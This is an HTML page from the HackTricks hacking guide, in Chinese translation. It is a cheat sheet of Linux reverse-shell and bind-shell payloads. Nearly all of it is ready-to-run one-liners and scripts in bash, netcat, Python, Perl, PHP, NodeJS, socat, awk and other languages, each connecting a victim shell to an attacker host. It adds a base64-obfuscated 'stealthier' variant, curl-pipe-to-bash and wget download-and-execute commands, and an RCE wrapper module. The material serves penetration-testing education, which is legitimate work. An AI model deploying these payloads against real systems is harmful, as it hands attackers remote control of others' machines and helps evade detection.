<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Reverse Shells - Linux</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="shells---linux"><a class="header" href="#shells---linux">Shells - Linux</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<p><strong>如果你对这些 shell 有任何疑问，可以查看</strong> <a href="https://explainshell.com"><strong>https://explainshell.com/</strong></a></p>
<h2 id="full-tty"><a class="header" href="#full-tty">Full TTY</a></h2>
<p><strong>一旦你获得了反向 shell</strong><a href="full-ttys.html"> <strong>请阅读此页面以获取完整 TTY</strong></a><strong>.</strong></p>
<h2 id="bash--sh"><a class="header" href="#bash--sh">Bash | sh</a></h2>
<pre><code class="language-bash">curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt; 0&gt;&amp;1
bash -i &gt;&amp; /dev/udp/127.0.0.1/4242 0&gt;&amp;1 #UDP
0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt;; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
exec 5&lt;&gt;/dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt;; while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done

#Short and bypass (credits to Dikline)
(sh)0&gt;/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec &gt;&amp;0
</code></pre>
<p>不要忘记检查其他 shell：sh、ash、bsh、csh、ksh、zsh、pdksh、tcsh 和 bash。</p>
<h3 id="符号安全-shell"><a class="header" href="#符号安全-shell">符号安全 shell</a></h3>
<pre><code class="language-bash">#If you need a more stable connection do:
bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt; 0&gt;&amp;1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i &gt;&amp; /dev/tcp/10.8.4.185/4444 0&gt;&amp;1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2&gt;/dev/null
</code></pre>
<h4 id="shell-解释"><a class="header" href="#shell-解释">Shell 解释</a></h4>
<ol>
<li><strong><code>bash -i</code></strong>: 该命令的这一部分启动一个交互式（<code>-i</code>）Bash shell。</li>
<li><strong><code>&gt;&amp;</code></strong>: 该命令的这一部分是<strong>将标准输出</strong>（<code>stdout</code>）和<strong>标准错误</strong>（<code>stderr</code>）<strong>重定向到同一目标</strong>的简写表示法。</li>
<li><strong><code>/dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt;</code></strong>: 这是一个特殊文件，<strong>表示与指定IP地址和端口的TCP连接</strong>。</li>
</ol>
<ul>
<li>通过<strong>将输出和错误流重定向到此文件</strong>，该命令有效地将交互式shell会话的输出发送到攻击者的机器。</li>
</ul>
<ol start="4">
<li><strong><code>0&gt;&amp;1</code></strong>: 该命令的这一部分<strong>将标准输入（<code>stdin</code>）重定向到与标准输出（<code>stdout</code>）相同的目标</strong>。</li>
</ol>
<h3 id="创建文件并执行"><a class="header" href="#创建文件并执行">创建文件并执行</a></h3>
<pre><code class="language-bash">echo -e '#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/1&lt;ATTACKER-IP&gt;/&lt;PORT&gt; 0&gt;&amp;1' &gt; /tmp/sh.sh; bash /tmp/sh.sh;
wget http://&lt;IP attacker&gt;/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
</code></pre>
<h2 id="forward-shell"><a class="header" href="#forward-shell">Forward Shell</a></h2>
<p>当处理基于Linux的Web应用程序中的**远程代码执行（RCE）**漏洞时，实现反向shell可能会受到网络防御的阻碍，例如iptables规则或复杂的数据包过滤机制。在这种受限环境中，另一种方法是建立一个PTY（伪终端）shell，以更有效地与被攻陷的系统进行交互。</p>
<p>为此推荐的工具是<a href="https://github.com/n3rada/toboggan.git">toboggan</a>，它简化了与目标环境的交互。</p>
<p>要有效使用toboggan，请创建一个针对目标系统RCE上下文的Python模块。例如，一个名为<code>nix.py</code>的模块可以结构如下：</p>
<pre><code class="language-python3">import jwt
import httpx

def execute(command: str, timeout: float = None) -&gt; str:
# Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
token = jwt.encode(
{"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&amp;L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
)

response = httpx.get(
url="https://vulnerable.io:3200",
headers={"Authorization": f"Bearer {token}"},
timeout=timeout,
# ||BURP||
verify=False,
)

# Check if the request was successful
response.raise_for_status()

return response.text
</code></pre>
<p>然后，您可以运行：</p>
<pre><code class="language-shell">toboggan -m nix.py -i
</code></pre>
<p>为了直接利用交互式 shell。您可以添加 <code>-b</code> 以实现 Burpsuite 集成，并删除 <code>-i</code> 以获得更基本的 rce 包装器。</p>
<p>另一个可能性是使用 <code>IppSec</code> 的前向 shell 实现 <a href="https://github.com/IppSec/forward-shell"><strong>https://github.com/IppSec/forward-shell</strong></a>。</p>
<p>您只需修改：</p>
<ul>
<li>漏洞主机的 URL</li>
<li>您的有效负载的前缀和后缀（如果有的话）</li>
<li>发送有效负载的方式（头部？数据？额外信息？）</li>
</ul>
<p>然后，您可以直接 <strong>发送命令</strong>，甚至 <strong>使用 <code>upgrade</code> 命令</strong> 来获取完整的 PTY（请注意，管道的读取和写入大约有 1.3 秒的延迟）。</p>
<h2 id="netcat"><a class="header" href="#netcat">Netcat</a></h2>
<pre><code class="language-bash">nc -e /bin/sh &lt;ATTACKER-IP&gt; &lt;PORT&gt;
nc &lt;ATTACKER-IP&gt; &lt;PORT&gt; | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;ATTACKER-IP&gt; &lt;PORT&gt; &gt;/tmp/f
nc &lt;ATTACKER-IP&gt; &lt;PORT1&gt;| /bin/bash | nc &lt;ATTACKER-IP&gt; &lt;PORT2&gt;
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0&lt;/tmp/bkpipe | nc &lt;ATTACKER-IP&gt; &lt;PORT&gt; 1&gt;/tmp/bkpipe
</code></pre>
<h2 id="gsocket"><a class="header" href="#gsocket">gsocket</a></h2>
<p>在 <a href="https://www.gsocket.io/deploy/">https://www.gsocket.io/deploy/</a> 查看它</p>
<pre><code class="language-bash">bash -c "$(curl -fsSL gsocket.io/x)"
</code></pre>
<h2 id="telnet"><a class="header" href="#telnet">Telnet</a></h2>
<pre><code class="language-bash">telnet &lt;ATTACKER-IP&gt; &lt;PORT&gt; | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|telnet &lt;ATTACKER-IP&gt; &lt;PORT&gt; &gt;/tmp/f
telnet &lt;ATTACKER-IP&gt; &lt;PORT&gt; | /bin/bash | telnet &lt;ATTACKER-IP&gt; &lt;PORT&gt;
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0&lt;/tmp/bkpipe | telnet &lt;ATTACKER-IP&gt; &lt;PORT&gt; 1&gt;/tmp/bkpipe
</code></pre>
<h2 id="whois"><a class="header" href="#whois">Whois</a></h2>
<p><strong>攻击者</strong></p>
<pre><code class="language-bash">while true; do nc -l &lt;port&gt;; done
</code></pre>
<p>要发送命令，请写下它，按回车，然后按CTRL+D（以停止STDIN）</p>
<p><strong>受害者</strong></p>
<pre><code class="language-bash">export X=Connected; while true; do X=`eval $(whois -h &lt;IP&gt; -p &lt;Port&gt; "Output: $X")`; sleep 1; done
</code></pre>
<h2 id="python"><a class="header" href="#python">Python</a></h2>
<pre><code class="language-bash">#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
</code></pre>
<h2 id="perl"><a class="header" href="#perl">Perl</a></h2>
<pre><code class="language-bash">perl -e 'use Socket;$i="&lt;ATTACKER-IP&gt;";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'
</code></pre>
<h2 id="ruby"><a class="header" href="#ruby">Ruby</a></h2>
<pre><code class="language-bash">ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
</code></pre>
<h2 id="php"><a class="header" href="#php">PHP</a></h2>
<pre><code class="language-php">// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
&lt;?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock), $pipes); ?&gt;

&lt;?php exec("/bin/bash -c 'bash -i &gt;/dev/tcp/10.10.14.8/4444 0&gt;&amp;1'"); ?&gt;
</code></pre>
<h2 id="java"><a class="header" href="#java">Java</a></h2>
<pre><code class="language-bash">r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/ATTACKING-IP/80;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])
p.waitFor()
</code></pre>
<h2 id="ncat"><a class="header" href="#ncat">Ncat</a></h2>
<pre><code class="language-bash">victim&gt; ncat &lt;ip&gt; &lt;port,eg.443&gt; --ssl  -c  "bash -i 2&gt;&amp;1"
attacker&gt; ncat -l &lt;port,eg.443&gt; --ssl
</code></pre>
<h2 id="golang"><a class="header" href="#golang">Golang</a></h2>
<pre><code class="language-bash">echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; rm /tmp/t.go
</code></pre>
<h2 id="lua"><a class="header" href="#lua">Lua</a></h2>
<pre><code class="language-bash">#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"
#Windows &amp; Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
</code></pre>
<h2 id="nodejs"><a class="header" href="#nodejs">NodeJS</a></h2>
<pre><code class="language-javascript">(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.2/6767 0&gt;&amp;1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
</code></pre>
<h2 id="openssl"><a class="header" href="#openssl">OpenSSL</a></h2>
<p>攻击者 (Kali)</p>
<pre><code class="language-bash">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;l_port&gt; #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;l_port2&gt; #Here yo will be able to get the response
</code></pre>
<p>受害者</p>
<pre><code class="language-bash">#Linux
openssl s_client -quiet -connect &lt;ATTACKER_IP&gt;:&lt;PORT1&gt;|/bin/bash|openssl s_client -quiet -connect &lt;ATTACKER_IP&gt;:&lt;PORT2&gt;

#Windows
openssl.exe s_client -quiet -connect &lt;ATTACKER_IP&gt;:&lt;PORT1&gt;|cmd.exe|openssl s_client -quiet -connect &lt;ATTACKER_IP&gt;:&lt;PORT2&gt;
</code></pre>
<h2 id="socat"><a class="header" href="#socat"><strong>Socat</strong></a></h2>
<p><a href="https://github.com/andrew-d/static-binaries">https://github.com/andrew-d/static-binaries</a></p>
<h3 id="绑定-shell"><a class="header" href="#绑定-shell">绑定 shell</a></h3>
<pre><code class="language-bash">victim&gt; socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker&gt; socat FILE:`tty`,raw,echo=0 TCP:&lt;victim_ip&gt;:1337
</code></pre>
<h3 id="反向-shell"><a class="header" href="#反向-shell">反向 shell</a></h3>
<pre><code class="language-bash">attacker&gt; socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim&gt; socat TCP4:&lt;attackers_ip&gt;:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
</code></pre>
<h2 id="awk"><a class="header" href="#awk">Awk</a></h2>
<pre><code class="language-bash">awk 'BEGIN {s = "/inet/tcp/0/&lt;IP&gt;/&lt;PORT&gt;"; while(42) { do{ printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != "exit") close(s); }}' /dev/null
</code></pre>
<h2 id="finger"><a class="header" href="#finger">Finger</a></h2>
<p><strong>攻击者</strong></p>
<pre><code class="language-bash">while true; do nc -l 79; done
</code></pre>
<p>要发送命令，请写下它，按回车，然后按CTRL+D（以停止STDIN）</p>
<p><strong>受害者</strong></p>
<pre><code class="language-bash">export X=Connected; while true; do X=`eval $(finger "$X"@&lt;IP&gt; 2&gt; /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@&lt;IP&gt; 2&gt; /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
</code></pre>
<h2 id="gawk"><a class="header" href="#gawk">Gawk</a></h2>
<pre><code class="language-bash">#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd&gt; "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |&amp; Service
Service |&amp; getline cmd
if (cmd) {
while ((cmd |&amp; getline) &gt; 0)
print $0 |&amp; Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
</code></pre>
<h2 id="xterm"><a class="header" href="#xterm">Xterm</a></h2>
<p>这将尝试通过6001端口连接到您的系统：</p>
<pre><code class="language-bash">xterm -display 10.0.0.1:1
</code></pre>
<p>要捕获反向 shell，您可以使用（将监听端口 6001）：</p>
<pre><code class="language-bash"># Authorize host
xhost +targetip
# Listen
Xnest :1
</code></pre>
<h2 id="groovy"><a class="header" href="#groovy">Groovy</a></h2>
<p>由 <a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">frohoff</a> 注意：Java 反向 shell 也适用于 Groovy</p>
<pre><code class="language-bash">String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
</code></pre>
<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
<ul>
<li><a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">https://highon.coffee/blog/reverse-shell-cheat-sheet/</a></li>
<li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell</a></li>
<li><a href="https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/">https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a></li>
</ul>
<p>{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../generic-hacking/reverse-shells/windows.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../generic-hacking/reverse-shells/expose-local-to-the-internet.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../generic-hacking/reverse-shells/windows.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../generic-hacking/reverse-shells/expose-local-to-the-internet.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
